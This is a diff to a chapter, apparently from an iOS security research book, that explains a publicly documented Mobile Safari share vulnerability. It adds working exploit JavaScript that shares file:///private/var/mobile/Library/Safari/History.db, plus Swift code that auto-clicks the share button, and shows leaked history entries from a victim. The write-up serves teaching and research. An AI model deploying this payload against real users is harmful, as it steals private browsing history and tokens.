@@ -295,11 +295,51 @@ we see it opens the file (with a predictable path)
 /private/var/mobile/Library/Safari/History.db
 ```
 
-In an exploit documented at [https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html](./Bibliography.md#MSSV) by Pawel Wylecial, it was demonstrated that when performing a Share the Share URL is not constrained to the web page resources.  Private resources via the `file://` schema are supported but this means a malicious share URL can leak sensitive information.
+In an exploit documented at [https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html](./Bibliography.md#MSSV) by Pawel Wylecial, it was demonstrated that when performing a Share the Share URL is not constrained to the web page resources.  Private resources via the `file://` schema are supported so this means a malicious share URL can leak sensitive information.
+
+The malicious Javascript code is:
+```
+<script>
+var opts = {
+text: 'check out this cute kitten! http://somerandomimagewebsite.com/cat.jpg\n
+\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n',
+url: 'file:///private/var/mobile/Library/Safari/History.db'};
+
+function run() {
+ navigator.share(opts);
+}
+</script>
+```
+
+A button action runs this code:
+```
+<button id="share-btn-id" class="button button1" onclick='run();'>
+Share this photo</button>
+```
+
+The containing app even clicks on this button on behalf of the user so they are only left with picking the share target:
+```
+extension ViewController: WKNavigationDelegate {
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        if !autoPressedButton {
+            webViewOutlet.evaluateJavaScript(
+            "document.getElementById('share-btn-id').click()") { (_, error) in
+                if error == nil {
+                    self.autoPressedButton = true
+                }
+            }
+        }
+    }
+}
+```
 
 To demonstrate the vulnerability with a free standing app, see `examples/history` from the [The Road to Zero GitHub](./Bibliography.md#TRTZ) website.  This app merely loads a malicious web page, which has a link to file:///private/var/mobile/Library/Safari/History.db, and upon loading, will also automatically click the share button, so all the user has to do is to pick the sharing target, such as Messages.
 
-Once shared, the recipient and view the website browsing history of the victim using a simple SQL Lite command.  We see output similar to the below:
+| ![Mobile Safari Share Vulnerability](./mobile-safari-share-vulnerability.jpg) |
+|:--:|
+| **Mobile Safari Share Vulnerability** |
+
+Once shared, the recipient can view the website browsing history of the victim using a simple SQL Lite command having first saved the `History.db` file locally on a Mac.  We see output similar to the below:
 
 ```
 # sqlite3 ~/Downloads/History.db
@@ -315,6 +355,9 @@ INSERT INTO history_items VALUES(1209,'http://www.cydiaimpactor.com/','cydiaimpa
 .
 .
 ```
+
+Clearly this demonstrates that the victim had visited the iPhone Wiki and Cydia Impactor websites, and also had used Microsoft One Drive.  Critical tokens were also leaked but have been censored from the above verbose dump.
+
 ## Documenting the Journey
 
 We have just scratched the surface of `MobileSafari`.  In a way we have half-cheated.  We did not find a zero day from our own efforts but we did find interesting information.  When correlated to an actual exploit we can see what we have done would have taken us a step closer to the exploit.
